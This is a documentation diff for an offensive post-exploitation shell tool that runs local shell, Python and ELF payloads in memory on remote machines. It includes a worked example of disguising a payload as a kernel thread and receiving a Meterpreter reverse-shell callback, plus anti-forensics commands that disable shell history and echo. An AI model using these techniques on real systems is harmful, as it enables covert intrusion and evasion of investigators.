@@ -290,25 +290,71 @@ SUID + SGID Binaries:
 
 ### !sh
 
+`!sh [local script]` Runs a shell script from the local machine in memory.
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
 ### !py
+
+* Use `!py` if python2.7 is on the target and not python3&#x20;
+* `!py [local script]` executes a local Python script on the remote machine, and does so _entirely in memory_. Check out my [other repository](https://github.com/JusticeRage/freedomfighting) for scripts you might want to use. This commands uses a multiline syntax with `<<`, which means that pseudo-shells that don't support it (Weevely is a good example of that) will break this command quite badly.
 
 ### !py3
 
+`!py3 [local script]` does the exact same thing except for a system with python3
+
+```
+!py3 /tmp/strangeDirs.py -p /dev/shm
+Path exists...continuing
+HIT: /dev/shm/,.
+Total Hits: 1
+```
+
 ### !elf
+
+* `!elf [local script]` Runs an executable from the local machine in memory, requires python2.7 on remote machine.
 
 ### !elf3&#x20;
 
-* `!sh [local script]` Runs a shell script from the local machine in memory.
-* `!py [local script]` executes a local Python script on the remote machine, and does so _entirely in memory_. Check out my [other repository](https://github.com/JusticeRage/freedomfighting) for scripts you might want to use. This commands uses a multiline syntax with `<<`, which means that pseudo-shells that don't support it (Weevely is a good example of that) will break this command quite badly.
-* `!py3 [local script]` does the exact same thing except for system with python3
-* Please see below for `!elf` and `!elf3` warnings.
+* This is by far the most impressive module in my opinion.
 * `!elf3 [local script]` Runs an executable from the local machine in memory, requires python3 on the remote machine.
-* `!elf [local script]` Runs an executable from the local machine in memory, requires python2.7 on remote machine.
+
+```
+#payload on neo docker 
+neo@feff0b418db6:/tmp$ mv shell.elf '[scsi_eh_1]'
+#on remote device 
+!elf3 /tmp/meoware
+100%|████████████████████████████████████████████████████████████████████████████████████████████████| 336/336 [00:00<00:00, 2.53Mo/s]
+Child process PID: 9292
+#get call back on C2
+msf6 exploit(multi/handler) > [*] Started reverse TCP handler on 10.0.0.2:443 
+[*] Sending stage (3045348 bytes) to 10.0.0.2
+[*] Meterpreter session 2 opened (10.0.0.2:443 -> 10.0.0.2:53702) at 2023-08-01 21:31:47 -0400
+
+msf6 exploit(multi/handler) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > sysinfo
+Computer     : 10.0.0.2
+OS           : Debian  (Linux 6.1.0-kali7-amd64)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter >
+```
 
 #### Stealth Commands
 
 * I am fully aware these two modules are the opposite of "stealthy" but it is where they are currently placed until an alternative location can be worked out. This stealth category will more than likely contain commands that help you blend in better in addition to those commands that might make you stick out.
-* `!pty` spawns a TTY, which is something you don't want in most cases because it tends to leave forensics evidence. However, some commands (`sudo`) or exploits require a TTY to run in so this is provided as a convenience. `UNSET HISTFILE HISTFILESIZE HISTSIZE PROMPT_COMMAND` is passed to it as soon as it spawns, along with `export TERM=xterm`
+* `!pty` spawns a TTY, which is something you don't want in most cases because it tends to leave forensics evidence. However, some commands (`sudo`) or exploits require a TTY to run in so this is provided as a convenience.&#x20;
+* Commands auto passed into the remote session when a pty is spawned:
+* `unset HISTFILE HISTFILESIZE HISTSIZE PROMPT_COMMAND`
+* `stty -echo`
+* `export TERM=xterm`
+* `unset SSH_CONNECTION`
+
+### !sudo
+
 * `!sudo` Invoke sudo without a TTY.
 
 Plugins can be further configured by editing `ffm.conf`.
